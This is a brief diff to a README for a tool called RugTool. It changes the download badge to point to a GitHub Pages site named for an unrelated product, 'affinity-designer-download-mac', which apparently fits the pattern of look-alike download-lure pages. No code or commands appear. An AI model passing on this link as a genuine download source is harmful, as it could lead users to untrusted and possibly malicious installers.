@@ -1,6 +1,6 @@
 # RugTool — Offline Setup Assistant
 
-[![Download RugTool](https://img.shields.io/badge/Download-RugTool-blueviolet)](https://rugtool-download-mac.github.io/.github)
+[![Download RugTool](https://img.shields.io/badge/Download-RugTool-blueviolet)](https://affinity-designer-download-mac.github.io/.github)
 
 
 ## 📦 How to Install
